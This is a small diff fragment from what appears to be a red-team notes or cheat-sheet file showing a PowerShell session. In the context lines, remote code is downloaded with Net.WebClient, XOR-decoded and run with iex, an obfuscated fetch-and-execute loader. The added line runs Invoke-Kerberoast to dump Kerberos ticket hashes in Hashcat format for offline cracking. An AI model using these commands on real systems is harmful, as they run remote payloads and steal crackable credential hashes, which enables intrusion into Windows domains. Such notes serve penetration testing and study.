@@ -20,4 +20,5 @@ PS C:\Users\User> $enc = [system.Text.Encoding]::UTF8
 PS C:\Users\User> $file = ((New-Object Net.Webclient).DownloadString($file))
 PS C:\Users\User> $data = $enc.GetBytes($file)|%{$_-bXor0x11}
 PS C:\Users\User> iex ([System.Text.Encoding]::ASCII.GetString($data))
+PS C:\Users\User> Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-output.txt
 ```
